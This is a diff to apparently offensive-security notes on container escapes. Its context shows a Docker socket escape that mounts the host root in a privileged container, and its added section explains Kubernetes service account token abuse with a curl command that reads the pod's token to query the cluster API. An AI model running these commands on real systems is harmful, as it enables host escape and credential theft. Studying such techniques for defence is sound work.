@@ -29,3 +29,12 @@ Can create new privileged containers to escape to host
 ls /var/run/docker.sock  # check if socket is mounted
 docker -H unix:///var/run/docker.sock run --privileged \
   -v /:/host ubuntu chroot /host
+
+3. Kubernetes Misconfiguration
+Default service account tokens mounted in every pod
+If a pod is compromised, attacker uses the token to query Kubernetes API
+Can list secrets, create privileged pods, or access other namespaces
+
+# Check if pod has API access
+curl -k https://kubernetes.default.svc/api \
+  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
